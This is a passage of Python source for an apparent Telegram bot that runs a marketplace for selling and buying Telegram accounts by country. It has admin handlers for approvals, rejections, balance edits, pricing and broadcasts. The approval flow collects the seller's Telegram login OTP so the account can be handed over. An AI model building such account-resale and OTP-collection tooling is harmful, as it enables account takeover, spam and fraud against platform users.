💰 **Sell Price:** ${sell_price} USD
💰 **Buy Price:** ${buy_price} USD (auto-calculated)

This country is now available for users to buy/sell accounts!
"""

    keyboard = [
        [InlineKeyboardButton("🆕 Add Another Country", callback_data="admin_add_new_country")],
        [InlineKeyboardButton("🔙 Price Control", callback_data="admin_sell_price_control")],
        [InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

    # Clear context
    context.user_data.pop('admin_add_new_country', None)
    context.user_data.pop('new_country_name', None)

async def admin_buy_price_control_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin buy price control callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    price_control_text = """
🛒 **Buy Account Price Control**

Change country buy prices. Write the country name in English:

Examples:
• bangladesh
• usa  
• germany

Please enter the country name:
"""

    context.user_data['admin_buy_price_control'] = True
    keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(price_control_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_price_control_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin price control callback (legacy - should not be used)"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    price_control_text = """
🔧 **Price Control Panel**

Change country prices. Write the country name in English:

Examples:
• bangladesh
• usa  
• germany

Please enter the country name:
"""

    context.user_data['admin_price_control'] = True
    keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(price_control_text, reply_markup=reply_markup, parse_mode='Markdown')

async def approve_sell_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin approval for sell request"""
    query = update.callback_query
    await query.answer()

    admin_id = str(query.from_user.id)
    if admin_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    # Parse callback data: approve_sell_{user_id}_{price}
    data_parts = query.data.split('_')
    if len(data_parts) != 4:
        await query.answer("❌ Invalid Data!", show_alert=True)
        return

    user_id = data_parts[2]
    price = float(data_parts[3])

    # Mark as approved in user context
    # Note: ConversationHandler state is per user/chat, so we need to access the correct context
    # However, since the user is in WAITING_FOR_ADMIN_APPROVAL state, we can set it in their user_data
    # We'll use the dispatcher/application context if possible, but for now we rely on the bot's ability to store it.
    
    # In python-telegram-bot, context.application.user_data[int(user_id)] is the way to access it
    context.application.user_data[int(user_id)]['admin_approved'] = True
    context.application.user_data[int(user_id)]['approval_time'] = datetime.now()

    # Get country info for the notification
    user_context = context.application.user_data[int(user_id)]
    country_data = user_context.get('country_data', {})
    country_name = country_data.get('name', 'Unknown')
    user_number = user_context.get('user_number', 'Unknown')

    # Update admin message
    approved_text = f"""
✅ **Sell Request Approved!**

👤 **User:** {user_id}
💰 **Price:** ${price} USD
📈 **Status:** Approved - Waiting for user's OTP
"""

    await query.edit_message_text(approved_text, parse_mode='Markdown')

    # Notify user to continue with OTP
    try:
        # NOTE: We no longer create a processing entry here.
        # It will be created ONLY when admin confirms the OTP.

        keyboard = [[InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale_otp")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        otp_prompt = await context.bot.send_message(
            chat_id=user_id,
            text=f"✅ **Your request has been approved!**\n\nPlease enter the **verification code (OTP)** sent to your Telegram account for number:\n🌍 **Country:** {country_name}\n📞 `{user_number}`\n\n💰 Once verified, ${price} USD will be added to your balance.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        # Remember the OTP prompt message id in the target user's data so we can delete it later
        try:
            context.application.user_data[int(user_id)]['otp_prompt_msg_id'] = otp_prompt.message_id
            context.application.user_data[int(user_id)]['otp_prompt_chat_id'] = otp_prompt.chat_id
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Failed to notify user {user_id}: {e}")

async def reject_sell_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection for sell request"""
    query = update.callback_query
    await query.answer()

    admin_id = str(query.from_user.id)
    if admin_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    # Parse callback data: reject_sell_{user_id}
    data_parts = query.data.split('_')
    if len(data_parts) != 3:
        await query.answer("❌ Invalid Data!", show_alert=True)
        return

    user_id = data_parts[2]

    # Update admin message
    rejected_text = f"""
❌ **Sell Request Rejected!**

👤 **User:** {user_id}
🚫 **Status:** Rejected - User cannot proceed
"""

    await query.edit_message_text(rejected_text, parse_mode='Markdown')

    # Reset user state and force end conversation
    user_id_int = int(user_id)
    if user_id_int in context.application.user_data:
        context.application.user_data[user_id_int].clear()
    
    # Ensure page is reset when entering sell flow
    if 'sell_page' in context.user_data:
        context.user_data.pop('sell_page')
    
    # End conversation for the user
    context.application.drop_user_data(user_id_int)

    # Notify user of rejection
    try:
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ **Sell Failed!**\n\nYour account sell request has been rejected. Please try again later.",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to notify user {user_id}: {e}")

async def reject_sms_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection with SMS for sell request"""
    query = update.callback_query
    await query.answer()

    admin_id = str(query.from_user.id)
    if admin_id != ADMIN_CHAT_ID:
        await query.answer("Access Denied!", show_alert=True)
        return

    # Parse callback data: reject_sms_{user_id}
    data_parts = query.data.split('_')
    if len(data_parts) != 3:
        await query.answer("Invalid Data!", show_alert=True)
        return

    user_id = data_parts[2]

    # Store user_id for SMS and ask admin to write message
    context.user_data['reject_sms_user_id'] = user_id

    sms_text = f"""
📩 **Reject with SMS**

👤 **User:** {user_id}

Please write the rejection message to send to the user:
"""

    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(sms_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_reject_sms_message_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection SMS message input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    user_id = context.user_data.get('reject_sms_user_id')
    if not user_id:
        return

    message = update.message.text.strip()

    # Send rejection message to user
    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"❌ **Sell Failed!**\n\n{message}",
            parse_mode='Markdown'
        )

        # Confirm to admin
        await update.message.reply_text(
            f"✅ **Rejection sent!**\n\n👤 User: {user_id}\n📩 Message: {message}",
            parse_mode='Markdown'
        )

        # Reset user state and force end conversation
        user_id_int = int(user_id)
        if user_id_int in context.application.user_data:
            context.application.user_data[user_id_int].clear()
        
        # End conversation for the user
        context.application.drop_user_data(user_id_int)

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send message: {e}")
        logger.error(f"Failed to send reject SMS to user {user_id}: {e}")

    # Clear context
    context.user_data.pop('reject_sms_user_id', None)

async def approve_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin approval for completed account"""
    query = update.callback_query
    await query.answer()

    admin_id = str(query.from_user.id)
    if admin_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    # Parse callback data: approve_{user_id}_{amount}
    data_parts = query.data.split('_')
    if len(data_parts) != 3:
        await query.answer("❌ Invalid Data!", show_alert=True)
        return

    user_id = data_parts[1]
    amount = float(data_parts[2])

    # Move from hold to main balance
    referrer_id = None
    referral_commission = 0.0
    
    with user_data_lock:
        if user_id not in user_data:
            await query.answer("❌ User not found!", show_alert=True)
            return
        
        # Admin manually approving moves from hold to main
        # We check hold balance
        if user_data[user_id]['hold_balance_usdt'] >= amount:
            old_hold = user_data[user_id]['hold_balance_usdt']
            old_main = user_data[user_id]['main_balance_usdt']
            user_data[user_id]['hold_balance_usdt'] -= amount
            user_data[user_id]['main_balance_usdt'] += amount
            user_data[user_id]['last_activity'] = datetime.now().isoformat()
            logger.info(f"Transferred {amount} for user {user_id}: Hold {old_hold}->{user_data[user_id]['hold_balance_usdt']}, Main {old_main}->{user_data[user_id]['main_balance_usdt']}")
            
            # Get updated balances for display
            current_hold = user_data[user_id]['hold_balance_usdt']
            current_main = user_data[user_id]['main_balance_usdt']
            
            # Process 3% referral commission
            referrer_id = user_data[user_id].get('referrer_id')
            if referrer_id and referrer_id in user_data:
                referral_commission = amount * 0.03
                user_data[referrer_id]['main_balance_usdt'] += referral_commission
                user_data[referrer_id]['referral_earnings'] += referral_commission
                logger.info(f"Referral commission: ${referral_commission:.4f} to {referrer_id} from user {user_id}'s income of ${amount}")
            
            save_user_data()
        else:
            # Fallback if hold is less than amount (e.g. admin error)
            await query.answer("❌ Insufficient Hold Balance!", show_alert=True)
            return

    # Update the admin message
    approved_text = f"""
✅ **Approval Completed!**

👤 **User:** {user_id}
💰 **Amount:** ${amount} USD
📈 **Hold → Main Balance Transferred**

⏳ **Current Hold:** {current_hold:.2f} USDT
💰 **Current Main:** {current_main:.2f} USDT
"""

    await query.edit_message_text(approved_text, parse_mode='Markdown')

    # Notify user
    try:
        # Get the number if available from context or user data
        sold_numbers = user_data[user_id].get('sold_numbers', [])
        number_info = f"\n📱 **Sold Number:** `{sold_numbers[-1]}`" if sold_numbers else ""

        success_text = (
            "🎊 **CONGRATULATIONS! SELL COMPLETED** 🎊\n\n"
            "Your account sale has been successfully approved by the administrator! ✅\n\n"
            f"💰 **Amount Added:** `${amount} USD`\n"
            f"{number_info}\n"
            "💳 **Status:** Successfully Completed\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✨ **Balance Update Details:**\n"
            "📥 **Hold Balance:** Amount has been deducted\n"
            "📤 **Main Balance:** Amount has been added\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "The funds are now available in your **Main Balance** for withdrawal. Even a beginner can understand that your hard-earned money is now ready to use! 🚀\n\n"
            "Thank you for choosing our service! 🙏"
        )

        await context.bot.send_message(
            chat_id=user_id,
            text=success_text,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to notify user {user_id}: {e}")
    
    # Notify referrer about commission
    if referrer_id and referral_commission > 0:
        try:
            await context.bot.send_message(
                chat_id=referrer_id,
                text=f"💰 **Referral Commission!**\n\nYou earned ${referral_commission:.4f} (3%) from your referral's income!",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to notify referrer {referrer_id}: {e}")

async def reject_pin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection for PIN submission"""
    query = update.callback_query
    await query.answer()

    admin_id = str(query.from_user.id)
    if admin_id != ADMIN_CHAT_ID:
        await query.answer("Access Denied!", show_alert=True)
        return

    # Parse callback data: reject_pin_{user_id}_{price}
    data_parts = query.data.split('_')
    if len(data_parts) != 4:
        await query.answer("Invalid Data!", show_alert=True)
        return

    user_id = data_parts[2]
    price = float(data_parts[3])

    # Deduct the rejected amount from hold balance
    with user_data_lock:
        if user_id in user_data:
            user_data[user_id]['hold_balance_usdt'] = max(0, user_data[user_id]['hold_balance_usdt'] - price)
            current_hold = user_data[user_id]['hold_balance_usdt']
        else:
            current_hold = 0.0
    save_user_data()

    # Update admin message
    rejected_text = f"""
❌ **PIN Request Rejected!**

👤 **User:** {user_id}
💰 **Deducted:** ${price} USD
⏳ **Current Hold Balance:** ${current_hold:.2f} USD
🚫 **Status:** Rejected
"""

    await query.edit_message_text(rejected_text, parse_mode='Markdown')

    # Notify user with detailed message
    user_message = f"""
❌ **Account Rejected!**

Your account sell request has been rejected.
💰 **${price} USD** has been deducted from your Hold Balance.

⏳ Please try again after a few hours or try with a different number.

Use the buttons below to continue:
"""
    keyboard = [
        [InlineKeyboardButton("💰 Check Balance", callback_data="balance")],
        [InlineKeyboardButton("🔙 Sell Another Account", callback_data="sell_account")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=user_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to notify user {user_id}: {e}")

async def reject_pin_sms_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection with SMS for PIN submission"""
    query = update.callback_query
    await query.answer()

    admin_id = str(query.from_user.id)
    if admin_id != ADMIN_CHAT_ID:
        await query.answer("Access Denied!", show_alert=True)
        return

    # Parse callback data: reject_pin_sms_{user_id}_{price}
    data_parts = query.data.split('_')
    if len(data_parts) != 5:
        await query.answer("Invalid Data!", show_alert=True)
        return

    user_id = data_parts[3]
    price = float(data_parts[4])

    # Store user_id and price for SMS
    context.user_data['reject_pin_sms_user_id'] = user_id
    context.user_data['reject_pin_sms_price'] = price

    sms_text = f"""
📩 **Reject PIN with SMS**

👤 **User:** {user_id}
💰 **Price:** ${price} USD

Please write the rejection message to send to the user:
"""

    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(sms_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_reject_pin_sms_message_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin rejection PIN SMS message input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    user_id = context.user_data.get('reject_pin_sms_user_id')
    price = context.user_data.get('reject_pin_sms_price', 0.0)
    if not user_id:
        return

    message = update.message.text.strip()

    # Deduct the rejected amount from hold balance
    with user_data_lock:
        if user_id in user_data:
            user_data[user_id]['hold_balance_usdt'] = max(0, user_data[user_id]['hold_balance_usdt'] - price)
            current_hold = user_data[user_id]['hold_balance_usdt']
        else:
            current_hold = 0.0
    save_user_data()

    # Send rejection message to user with balance info
    user_message = f"""
❌ **Account Rejected!**

{message}

💰 **${price} USD** has been deducted from your Hold Balance.

⏳ Please try again after a few hours or try with a different number.
"""
    keyboard = [
        [InlineKeyboardButton("💰 Check Balance", callback_data="balance")],
        [InlineKeyboardButton("🔙 Sell Another Account", callback_data="sell_account")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=user_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

        # Confirm to admin
        await update.message.reply_text(
            f"✅ **Rejection sent!**\n\n👤 User: {user_id}\n💰 Deducted: ${price} USD\n⏳ Current Hold: ${current_hold:.2f} USD\n📩 Message: {message}",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send message: {e}")
        logger.error(f"Failed to send reject PIN SMS to user {user_id}: {e}")

    # Clear context
    context.user_data.pop('reject_pin_sms_user_id', None)
    context.user_data.pop('reject_pin_sms_price', None)

async def admin_balance_control_start(update: Update, context: ContextTypes.DEFAULT_TYPE, balance_type: str) -> None:
    """Start admin balance control process"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    balance_name = "Main Balance" if balance_type == 'main' else "Hold Balance"

    control_text = f"""
🔧 **{balance_name} Control**

Please provide the user's **Chat ID**:

Example: 123456789

⚠️ **Note:** Chat ID must be correct.
"""

    keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Store balance type in context
    context.user_data['admin_balance_type'] = balance_type

    await query.edit_message_text(control_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_user_id_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin user ID input for balance control"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    user_id = update.message.text.strip()

    # Validate user ID
    if not user_id.isdigit():
        await update.message.reply_text("❌ User ID must be a number!")
        return

    # Get or create user data (allows adding balance to users who haven't started bot yet)
    user_info = get_user_data(user_id)
    balance_type = context.user_data.get('admin_balance_type', 'main')
    balance_name = "Main Balance" if balance_type == 'main' else "Hold Balance"
    current_balance = user_info['main_balance_usdt'] if balance_type == 'main' else user_info['hold_balance_usdt']

    balance_info_text = f"""
💳 **{balance_name} Control**

👤 **User ID:** {user_id}
💰 **Current {balance_name}:** {current_balance:.2f} USDT

What would you like to do?
"""

    keyboard = [
        [
            InlineKeyboardButton("➕ Add Balance", callback_data=f"admin_add_{balance_type}_{user_id}"),
            InlineKeyboardButton("➖ Remove Balance", callback_data=f"admin_remove_{balance_type}_{user_id}")
        ],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(balance_info_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_add_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin add/remove balance callback"""
    query = update.callback_query
    await query.answer()

    admin_id = str(query.from_user.id)
    if admin_id != ADMIN_CHAT_ID:
        await query.answer("❌ Access Denied!", show_alert=True)
        return

    # Parse callback data: admin_{action}_{balance_type}_{user_id}
    data_parts = query.data.split('_')
    if len(data_parts) != 4:
        await query.answer("❌ Invalid Data!", show_alert=True)
        return

    action = data_parts[1]  # add or remove
    balance_type = data_parts[2]  # main or hold
    user_id = data_parts[3]

    action_text = "Add" if action == 'add' else "Remove"
    balance_name = "Main Balance" if balance_type == 'main' else "Hold Balance"

    amount_request_text = f"""
💰 **{action_text} {balance_name}**

👤 **User ID:** {user_id}

Please enter amount (USD):

Example: 10.50
"""

    # Store operation details in context
    context.user_data['admin_operation'] = {
        'action': action,
        'balance_type': balance_type,
        'user_id': user_id
    }

    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(amount_request_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin amount input for balance control"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    operation = context.user_data.get('admin_operation')
    if not operation:
        await update.message.reply_text("❌ Operation data not found!")
        return

    try:
        amount_input = update.message.text.strip()
        amount = float(amount_input)
        
        # Validate amount range
        if amount <= 0:
            await update.message.reply_text("❌ Amount must be greater than zero!")
            return
        if amount > 100000:
            await update.message.reply_text("❌ Amount cannot exceed $100,000 USD!")
            return
        if len(amount_input.split('.')) > 1 and len(amount_input.split('.')[1]) > 2:
            await update.message.reply_text("❌ Amount can have maximum 2 decimal places!")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number! Example: 100.50")
        return

    user_id = operation['user_id']
    action = operation['action']
    balance_type = operation['balance_type']

    # Get or create user data (allows adding balance to users who haven't started bot yet)
    get_user_data(user_id)
    
    # Update user balance with thread safety
    with user_data_lock:
        user_info = user_data[user_id]
            
        balance_field = 'main_balance_usdt' if balance_type == 'main' else 'hold_balance_usdt'
        balance_name = "Main Balance" if balance_type == 'main' else "Hold Balance"

        if action == 'add':
            user_info[balance_field] += amount
            action_text = "added"
        else:  # remove
            if user_info[balance_field] >= amount:
                user_info[balance_field] -= amount
                action_text = "removed"
            else:
                await update.message.reply_text(f"❌ Insufficient balance! Current: {user_info[balance_field]:.2f} USDT")
                return

    save_user_data()

    success_text = f"""
✅ **Operation Successful!**

👤 **User ID:** {user_id}
💰 **Amount:** ${amount:.2f} USD {action_text}
💳 **New {balance_name}:** {user_info[balance_field]:.2f} USDT
"""

    keyboard = [
        [InlineKeyboardButton("🔄 More Operations", callback_data=f"admin_{balance_type}_balance")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

    # Notify user
    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"💰 Your {balance_name} has been updated!\n\n${amount:.2f} USD {action_text}\nNew balance: {user_info[balance_field]:.2f} USDT"
        )
    except Exception as e:
        logger.error(f"Failed to notify user {user_id}: {e}")

    # Clear context
    context.user_data.pop('admin_operation', None)

async def handle_admin_price_control_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin price control country input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    country_input = update.message.text.strip().lower()

    # Determine if this is buy or sell price control
    is_sell_control = 'admin_sell_price_control' in context.user_data
    is_buy_control = 'admin_buy_price_control' in context.user_data
    
    # Validate country input
    if len(country_input) > 50 or not country_input.replace('_', '').replace(' ', '').isalpha():
        await update.message.reply_text("❌ Invalid country name format!")
        return
    
    # Find country in COUNTRIES_DATA
    found_country = None
    for country_key, country_data in COUNTRIES_DATA.items():
        if country_key == country_input or country_input in country_data['name'].lower():
            found_country = (country_key, country_data)
            break

    if found_country:
        country_key, country_data = found_country
        
        if is_sell_control:
            price_type = "Sell"
            current_price = country_data['sell_price']
            context.user_data['price_control_type'] = 'sell'
        elif is_buy_control:
            price_type = "Buy"
            current_price = country_data['buy_price']
            context.user_data['price_control_type'] = 'buy'
        else:
            # Legacy support
            price_type = "General"
            current_price = country_data.get('price', country_data['sell_price'])
            context.user_data['price_control_type'] = 'general'
            
        control_text = f"""
💰 **{price_type} Price Change**

🌍 **Country:** {country_data['name']}
💵 **Current {price_type} Price:** ${current_price} USD

Enter new {price_type.lower()} price (USD):

Example: 1.50
"""
        context.user_data['price_control_country'] = country_key
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(control_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        # Country not found, offer to add new country
        if is_sell_control:
            price_type = "Sell"
            context.user_data['price_control_type'] = 'sell'
        elif is_buy_control:
            price_type = "Buy"
            context.user_data['price_control_type'] = 'buy'
        else:
            price_type = "Sell"
            context.user_data['price_control_type'] = 'sell'
            
        add_country_text = f"""
🆕 **Add New Country for {price_type}**

🌍 **Country:** {country_input.title()}
❓ **Status:** New country (not in current list)

Enter the {price_type.lower()} price for this new country (USD):

Example: 1.50

Note: This will add '{country_input.title()}' to the available countries list.
"""
        # Store the new country data
        context.user_data['new_country_name'] = country_input
        context.user_data['price_control_country'] = 'new_country'
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_panel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(add_country_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_admin_price_change_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin price change input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    country_key = context.user_data.get('price_control_country')
    price_type = context.user_data.get('price_control_type', 'general')
    
    if not country_key:
        await update.message.reply_text("❌ Country data not found!")
        return

    try:
        price_input = update.message.text.strip()
        new_price = float(price_input)
        
        # Validate price range
        if new_price <= 0:
            await update.message.reply_text("❌ Price must be greater than zero!")
            return
        if new_price > 1000:
            await update.message.reply_text("❌ Price cannot exceed $1000 USD!")
            return
        if len(price_input.split('.')) > 1 and len(price_input.split('.')[1]) > 2:
            await update.message.reply_text("❌ Price can have maximum 2 decimal places!")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number! Example: 1.50")
        return

    # Check if this is a new country or existing country update
    if country_key == 'new_country':
        # Adding a new country
        new_country_name = context.user_data.get('new_country_name', 'Unknown')
        
        # Create appropriate emoji flag (simplified version)
        country_display_name = new_country_name.title()
        if '🇧🇩' not in country_display_name and 'bangladesh' in new_country_name.lower():
            country_display_name = f"Bangladesh 🇧🇩"
        elif not any(char in country_display_name for char in ['🇺🇸', '🇬🇧', '🇩🇪', '🇫🇷', '🇮🇳', '🇧🇩']):
            country_display_name = f"{country_display_name} 🌍"
        
        # Create new country key
        new_country_key = new_country_name.lower().replace(' ', '_')
        
        # Add to COUNTRIES_DATA
        if price_type == 'sell':
            COUNTRIES_DATA[new_country_key] = {
                'name': country_display_name,
                'sell_price': new_price,
                'buy_price': round(new_price * 1.3, 2)  # Auto-calculate buy price 30% higher
            }
            price_label = "Sell Price"
            next_callback = "admin_sell_price_control"
        elif price_type == 'buy':
            COUNTRIES_DATA[new_country_key] = {
                'name': country_display_name,
                'sell_price': round(new_price / 1.3, 2),  # Auto-calculate sell price 30% lower
                'buy_price': new_price
            }
            price_label = "Buy Price"
            next_callback = "admin_buy_price_control"
        else:
            COUNTRIES_DATA[new_country_key] = {
                'name': country_display_name,
                'sell_price': new_price,
                'buy_price': round(new_price * 1.3, 2)
            }
            price_label = "Price"
            next_callback = "admin_price_control"
        
        save_countries_data()
        
        success_text = f"""
✅ **New Country Added Successfully!**

🌍 **Country:** {country_display_name}
💰 **{price_label}:** ${new_price} USD
💰 **Auto-calculated {'Buy' if price_type == 'sell' else 'Sell'} Price:** ${COUNTRIES_DATA[new_country_key]['buy_price'] if price_type == 'sell' else COUNTRIES_DATA[new_country_key]['sell_price']} USD

This country is now available for users to buy/sell accounts!
"""
    else:
        # Update existing country price
        if price_type == 'sell':
            old_price = COUNTRIES_DATA[country_key]['sell_price']
            COUNTRIES_DATA[country_key]['sell_price'] = new_price
            price_label = "Sell Price"
            next_callback = "admin_sell_price_control"
        elif price_type == 'buy':
            old_price = COUNTRIES_DATA[country_key]['buy_price']
            COUNTRIES_DATA[country_key]['buy_price'] = new_price
            price_label = "Buy Price"
            next_callback = "admin_buy_price_control"
        else:
            # Legacy support - update sell_price for backward compatibility
            old_price = COUNTRIES_DATA[country_key].get('price', COUNTRIES_DATA[country_key]['sell_price'])
            COUNTRIES_DATA[country_key]['sell_price'] = new_price
            price_label = "Price"
            next_callback = "admin_price_control"

        save_countries_data()

        success_text = f"""
✅ **{price_label} Update Complete!**

🌍 **Country:** {COUNTRIES_DATA[country_key]['name']}
💰 **Old {price_label}:** ${old_price} USD
💰 **New {price_label}:** ${new_price} USD
"""

    keyboard = [
        [InlineKeyboardButton(f"🔄 More {price_label} Changes", callback_data=next_callback)],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

    # Clear context
    context.user_data.pop('price_control_country', None)
    context.user_data.pop('price_control_type', None)
    context.user_data.pop('admin_sell_price_control', None)
    context.user_data.pop('admin_buy_price_control', None)
    context.user_data.pop('admin_price_control', None)
    context.user_data.pop('new_country_name', None)

async def handle_admin_sms_all_users_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin SMS all users message input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    message_text = update.message.text.strip()

    # Send message to all users
    sent_count = 0
    failed_count = 0

    for user_id in user_data.keys():
        try:
            await context.bot.send_message(
                chat_id=user_id, 
                text=f"📩 **Message from Admin:**\n\n{message_text}",
                parse_mode='Markdown'
            )
            sent_count += 1
        except Exception as e:
            failed_count += 1
            logger.error(f"Failed to send message to user {user_id}: {e}")

    success_text = f"""
✅ **SMS Sent Successfully!**

📊 **Statistics:**
• Messages sent: {sent_count}
• Failed to send: {failed_count}
• Total users: {len(user_data)}

📩 **Message sent:**
{message_text}
"""

    keyboard = [
        [InlineKeyboardButton("📩 Send More SMS", callback_data="admin_send_sms")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

    # Clear context
    context.user_data.pop('admin_sms_all_users', None)

async def handle_admin_sms_single_user_id_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin SMS single user ID input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    try:
        target_user_id = int(update.message.text.strip())
        context.user_data['sms_target_user'] = target_user_id

        await update.message.reply_text(
            f"👤 **Target User ID:** {target_user_id}\n\n📝 **Now write the message:**\n\nExample: Hello! How are you doing?",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid numeric User ID!")

async def handle_admin_sms_single_user_message_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin SMS single user message input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    target_user_id = context.user_data.get('sms_target_user')
    message_text = update.message.text.strip()

    try:
        await context.bot.send_message(
            chat_id=target_user_id, 
            text=f"📩 **Message from Admin:**\n\n{message_text}",
            parse_mode='Markdown'
        )

        success_text = f"""
✅ **SMS Sent Successfully!**

👤 **Target User:** {target_user_id}
